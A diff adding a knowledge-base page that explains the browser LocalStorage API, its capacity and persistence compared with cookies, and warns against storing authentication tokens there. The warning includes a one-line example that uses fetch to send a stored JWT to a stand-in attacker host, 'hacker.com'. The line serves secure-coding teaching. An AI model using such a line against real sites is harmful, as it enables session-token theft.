@@ -1,0 +1,27 @@
+---
+title: LocalStorage
+description: A modern HTML5 Web Storage API providing persistent, synchronous, key-value storage directly within the browser.
+---
+import { ConceptTemplate } from '@/features/kb/components/templates/ConceptTemplate'
+
+<ConceptTemplate title="LocalStorage">
+
+Cookies are terrible for storing application data. They have a 4KB limit, and because the browser automatically attaches them to every single HTTP request, storing 4KB of data in a cookie means wasting 4KB of network bandwidth on every single image, CSS file, and API call.
+
+HTML5 introduced the **Web Storage API**, specifically **LocalStorage**, to solve this.
+
+## How it Works
+LocalStorage provides a simple, synchronous Key-Value store in the browser. 
+- `localStorage.setItem('theme', 'dark')`
+- `localStorage.getItem('theme')`
+
+## Key Features
+1. **Large Capacity**: Allows storing up to 5MB of data per domain (compared to the 4KB Cookie limit).
+2. **Never Sent to Server**: LocalStorage data is strictly client-side. It is never automatically attached to HTTP headers, saving massive amounts of bandwidth.
+3. **Persistence**: Data in LocalStorage has no expiration date. It persists even if the user completely closes the browser and reboots their computer. It is only cleared if the user manually wipes their browser cache.
+
+<Callout icon="warning" title="The Security Flaw">
+  LocalStorage does not have an `HttpOnly` equivalent. It is 100% accessible to JavaScript. Therefore, **you must never store JWTs or Authentication Tokens in LocalStorage**. If your site has a single XSS vulnerability, a hacker can easily write `fetch('hacker.com?token=' + localStorage.getItem('jwt'))` and completely bypass all security.
+</Callout>
+
+</ConceptTemplate>
